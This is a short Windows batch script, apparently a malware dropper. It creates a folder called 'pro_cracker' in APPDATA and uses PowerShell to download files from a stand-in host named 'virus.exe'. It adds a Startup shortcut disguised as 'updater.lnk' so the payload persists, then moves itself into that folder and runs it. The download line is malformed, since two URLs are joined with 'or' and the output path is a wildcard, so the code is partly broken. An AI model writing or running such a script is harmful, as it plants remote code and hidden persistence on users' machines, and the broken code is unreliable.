@echo off
md "%APPDATA%\pro_cracker"
powershell -command "Invoke-WebRequest -Uri 'http://example.com/virus_folders/* or http://example.com/virus.exe' -OutFile '%APPDATA%\pro_cracker\*'"
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk');$s.TargetPath='%APPDATA%\pro_cracker\updater.bat';$s.Save()"
move "%~f0" "%APPDATA%\pro_cracker"
call "%APPDATA%\pro_cracker\updater.bat"
